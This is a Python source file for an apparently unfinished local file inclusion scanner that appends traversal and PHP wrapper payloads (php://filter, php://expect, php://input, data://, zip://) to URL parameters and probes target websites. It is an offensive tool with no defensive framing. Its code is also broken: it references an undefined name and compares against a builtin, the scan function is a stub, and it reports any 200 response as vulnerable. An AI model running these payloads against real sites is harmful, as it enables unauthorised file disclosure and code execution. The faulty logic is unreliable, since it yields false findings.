#!/usr/bin/env python3

import os, sys
import re
import requests
import threading
from Crawler import Crawler

payloads = {
    "../": "../",
    "php://": {
        "filter": {
            "b64encode": "php://filter/convert.base64-encode/resource=",
            "b64decode": "php://filter/convert.base64-decode/resource=",
            "rot13"    : "php://filter/read=string.rot13/resource=",
            "utf-16"   : "php://filter/convert.iconv.utf-8.utf-16/resource="
        },
        "expect"       : "php://expect/",
        "input"        : "php://input"
    },
    "data://"          : "data://text/plain;base64,",
    "zip://"           : "zip://"
}

errors = [
    "Warning: file_exists()",
    "Warning: include()",
    "failed to open stream"    
]

tests = ["../", "php://", "data://", "zip://"]

def usage():
    print("Usage: ./lfiscan.py [option] [argument]")
    print("Options:")
    print("--url <url>            : URL of the website")
    print("--scan                 : Crawl the website to search for vulnerable URLs")
    print("--test                 : Tests an URL for LFI")
    print("--inject [type] [opts] : Executes LFI Injection on vulnerable URL")
    print("Be careful, this app only tracks for LFI vulnerabilities in URLs.")

def injectable(url):
    regex = re.compile('\?[a-zA-Z0-9]{1,}=')
    if regex.search(url):
        return True
    return False

def strip(url):
    if injectable(url):
        regex = re.compile('\?[a-zA-Z0-9]{1,}=')
        idx = re.findall(regex, url)
        return ''.join([url.split(idx[0])[0], idx[0]])
    else:
        print("Erreur, l'url rentrée n'est pas au bon format.")
        return ""

def scan(url):
    pass

def test(url):
    if injectable(url):
        for test in tests:
            payload = craftPayload(strip(url), test) 
            if inject(payload):
                print("Test is succesful !")
                print("Found the website vulnerable for", test, "LFI !")
                print("Payload:", payload)
    else:
        print("The url may not be injectable")

def craftPayload(url, itype, arguments=False):
    if itype == filter and not arguments == False:
        crafted = url + payload["filter"][arguments[0]] + arguments[1]
    elif itype in tests:
        crafted = url + itype
    else:
        crafted = url
        print("Couldn't craft payload.")
    return crafted

#lfiscan.py --inject --resource=index.php 
def inject(payload):
    if re.search('zip://', payload) or re.search('php://input', payload):
        pass
    else:
        r = requests.get(payload)
        if r.status_code == 200:
            vuln = False
            for error in errors:
                if error in r.text:
                    vuln = True
            print("Website might be vulnerable.")
            print("Try injecting with --inject [url]")
            return True
        elif r.status_code == 403:
            print("Website might be vulnerable: returned", r.status_code)
            return True
        elif r.status_code == 301 or r.status_code == 302:
            print("Website might be vulnerable: returned", r.status_code)
            return False
            
        

if __name__ == '__main__':
    if sys.argv[1] == "test":
        test(sys.argv[2])